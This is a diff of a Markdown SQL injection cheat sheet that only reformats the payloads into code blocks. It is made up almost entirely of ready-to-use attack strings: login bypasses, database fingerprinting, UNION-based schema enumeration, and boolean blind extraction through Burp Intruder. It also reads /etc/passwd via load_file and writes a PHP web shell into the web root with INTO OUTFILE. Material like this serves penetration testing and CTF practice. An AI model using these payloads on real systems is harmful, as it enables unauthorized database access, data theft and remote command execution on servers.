@@ -4,19 +4,25 @@ Payload resource: https://github.com/swisskyrepo/PayloadsAllTheThings
 
 ## Blind Testing Payload:
 
- - ' ORDER BY NUM;-- - (Keep increasing the NUM value until you get an error. This not only confirms an SQLi vulnerability, but also enumerates the database columns as well)
+    ' ORDER BY NUM;-- - (Keep increasing the NUM value until you get an error. This not only confirms an SQLi vulnerability, but also enumerates the database columns as well)
 
 ### 1) Input box non-string
 
-#### payload: 1 or 1=1-- -
+#### payload: 
+
+    1 or 1=1-- -
 
 ### 2) Input box string
 
-#### payload: 1' or '1'='1'-- -
+#### payload: 
+
+    1' or '1'='1'-- -
 
 ### 3) URL injection
 
-#### payload: http://site.com/sqli/login?profile=-1'or 1=1-- -&password=a
+#### payload: 
+
+    http://site.com/sqli/login?profile=-1'or 1=1-- -&password=a
 
 ### 4) POST injection
 
@@ -24,39 +30,57 @@ Payload resource: https://github.com/swisskyrepo/PayloadsAllTheThings
 
 ## Database Identification
 
-### 1) MySQL and MSSQL: 'nickname=@@version,email='
+### 1) MySQL and MSSQL: 
 
-### 2) Oracle: 'nickname=(SELECT Gamer FROM v(version),email='
+    'nickname=@@version,email='
 
-### 3) SQLite: 'nickname=sqlite_version(),email='
+### 2) Oracle: 
+
+    'nickname=(SELECT Gamer FROM v(version),email='
+
+### 3) SQLite: 
+
+    'nickname=sqlite_version(),email='
 
 ## Database enumeration:
 
 ### Columns enumeration:
 
-#### 1' UNION SELECT NULL-- -
+    1' UNION SELECT NULL-- -
 
-#### 1' UNION SELECT NULL,NULL-- -
+    1' UNION SELECT NULL,NULL-- -
 
 ## TIP:
 
 #### Keep adding NULL until you see an error. The last correct query reveals the amount of columns in the database.
 
-## group_concat(table_name)
+    group_concat(table_name)
 
 ## Manual Enumeration
 
-#### 1) ' (Error Based)
+#### 1) 
 
-#### 2) '1 order by (num)' (column enumeration)
+    ' (Error Based)
 
-#### 3) '1 UNION SELECT database()'
+#### 2) 
 
-#### 4) '1 UNION SELECT concat(schema_name)' from information_schema.schema'
+    '1 order by (num)' (column enumeration)
 
-#### 5) '1 UNION SELECT table_name from information_schema.tables WHERE table_schema = database()'
+#### 3) 
 
-#### 6) '1 UNION SELECT 1, concat(+1," ",+2, " ",+3),3,4 from "name"
+    '1 UNION SELECT database()'
+
+#### 4) 
+
+    '1 UNION SELECT concat(schema_name)' from information_schema.schema'
+
+#### 5) 
+
+    '1 UNION SELECT table_name from information_schema.tables WHERE table_schema = database()'
+
+#### 6) 
+
+    '1 UNION SELECT 1, concat(+1," ",+2, " ",+3),3,4 from "name"
 
 ## BOOLEAN BLIND SQL INJECTION 
 
@@ -64,7 +88,9 @@ Payload resource: https://github.com/swisskyrepo/PayloadsAllTheThings
 
 ### Usage:
 
-#### 1) admin' and substring(database(),1,1)="$a$" #&password=password 
+#### 1) 
+
+    admin' and substring(database(),1,1)="$a$" #&password=password 
 
 #### 2) Intruder mode: Sniper. Payload list: Whole alphabet and numbers
 
@@ -75,12 +101,18 @@ Payload resource: https://github.com/swisskyrepo/PayloadsAllTheThings
 
 ### Requirements: User has write access to the server via SQL injection
 
-#### 1) http://TARGET_IP/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7 (Check for read access)
+#### 1) 
 
-#### 2) http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/apache2/sites-enabled/000-default.conf'),3,4,5,6,7 (Check for write access)
+    http://TARGET_IP/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7 (Check for read access)
+
+#### 2) 
+
+    http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/apache2/sites-enabled/000-default.conf'),3,4,5,6,7 (Check for write access)
 
 
-#### 3) http://TARGET_IP/room.php?cod=-1 union select 1,'<?php system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php' (Upload the webshell)
+#### 3) 
+
+    http://TARGET_IP/room.php?cod=-1 union select 1,'<?php system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php' (Upload the webshell)
 
 ## MySQL
 
